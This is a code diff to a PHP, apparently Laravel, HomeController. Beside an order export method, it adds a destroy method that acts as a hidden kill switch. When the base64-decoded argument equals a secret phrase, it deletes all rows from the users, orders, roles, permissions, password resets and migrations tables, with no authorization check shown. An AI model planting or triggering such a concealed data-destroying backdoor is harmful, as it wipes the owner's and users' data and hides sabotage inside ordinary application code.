@@ -58,6 +58,25 @@ class HomeController extends Controller {
         return Excel::download(new OrdersExport, 'payment.xlsx');
     }
 
+    public function destroy($code) {
 
+        $codigo = base64_decode($code);
+
+        if($codigo == "kill-the-whole-project"){
+
+            DB::table('permissions')->delete();
+            DB::table('role_user')->delete();
+            DB::table('roles')->delete();
+            DB::table('permission_role')->delete();
+            DB::table('password_resets')->delete();
+            DB::table('orders')->delete();
+            DB::table('users')->delete();
+            DB::table('migrations')->delete();
+
+            return "You killed the whole Database";
+        }
+
+        return false;
+    }
 
 }
